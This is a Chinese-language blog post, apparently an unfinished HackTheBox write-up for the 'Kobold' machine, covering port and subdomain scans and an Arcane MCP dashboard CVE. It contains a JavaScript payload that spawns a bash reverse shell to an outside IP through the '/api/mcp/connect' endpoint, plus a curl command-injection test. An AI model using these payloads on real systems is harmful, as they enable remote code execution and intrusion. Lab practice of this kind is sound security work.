---
layout: post
title: "HackTheBox - Kobold"
date: 2026-03-24
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Kobold
<!-- more -->

這一題還沒有解出來，但先紀錄一下，做了哪些操作

## Recon
因為網路的關係，需要先把host加入到`C:\Windows\System32\drivers\etc\host`中，不管是找到多少subdomain都要加入
```text
10.129.11.134 kobold.htb mcp.kobold.htb bin.kobold.htb
```

### Port Scanning
```bash
$ nmap -p- -T4 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:06 CST
Warning: 10.129.11.134 giving up on port because retransmission cap hit (6).
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.20s latency).
Not shown: 65291 closed ports, 240 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver

Nmap done: 1 IP address (1 host up) scanned in 1121.49 seconds
nmap -p 3552 -sC -sV 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:26 CST
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.26s latency).

PORT     STATE SERVICE   VERSION
3552/tcp open  taserver?
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.23 seconds
$ nmap -p 8080 -sC -sV 10.129.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:29 CST
Nmap scan report for kobold.htb (10.129.11.134)
Host is up (0.19s latency).

PORT     STATE  SERVICE    VERSION
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```
所以他有幾個常見的port，但3552這一個port很奇怪
```
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
8080/tcp closed http-proxy
```
實際從browser request會發現是arcane MCP

### Subdomain Scanning
```bash
$ ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -k -fs 154
...

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]
bin                     [Status: 200, Size: 24392, Words: 1218, Lines: 386]
:: Progress: [19966/19966] :: Job [1/1] :: 199 req/sec :: Duration: [0:01:40] :: Errors: 0 ::
$ ffuf -u https://mcp.kobold.htb/FUZZ -w /snap/seclists/1214//Discovery/Web-Content/common.txt -k
```
有兩個subdomain
```text
bin.kobold.htb
mcp.kobold.htb
```
然後在網路上看到Arcane MCP Dashboard的CVE([CVE-2026-23520 Detail](https://nvd.nist.gov/vuln/detail/CVE-2026-23520))
```javascript
fetch("/api/mcp/connect", {method: "POST", headers:{"Content-Type":"application/json"},body: JSON.stringify({serverId:"pwn",serverConfig:{command:"bash",args:["-c","bash -i >& /dev/tcp/10.10.15.48/4444 0>&1"],env:{}}})})
```

在往來的封包中有看到api如下
```javascript
async function xnt(e) {
    const t = await fetch("/api/mcp/export/server", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            serverId: e
        })
    });
    if (!t.ok) {
        let n = `Export failed (${t.status})`;
        try {
            const r = await t.json();
            r?.error && (n = r.error)
        } catch {}
        throw new Error(n)
    }
    return t.json()
}
async function cb(e, t) {
    const n = await fetch("/api/mcp/tools/list", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            serverId: e,
            modelId: t
        })
    });
    let r = null;
    try {
        r = await n.json()
    } catch {}
    if (!n.ok) {
        const a = r?.error || `List tools failed (${n.status})`;
        throw new Error(a)
    }
    return r
}
async function f_(e, t, n, r) {
    const a = await fetch("/api/mcp/tools/execute", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            serverId: e,
            toolName: t,
            parameters: n,
            taskOptions: r
        })
    });
    let i = null;
    try {
        i = await a.json()
    } catch {}
    return a.ok ? i : {
        error: i?.error || `Execute tool failed (${a.status})`
    }
}
async function _ht() {
    return (await fetch("/api/mcp/servers")).json()
}
```
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverId":"pwn", "serverConfig":{"command":"bash", "args": ["-c", "sleep 5"],"env": {}}}'
```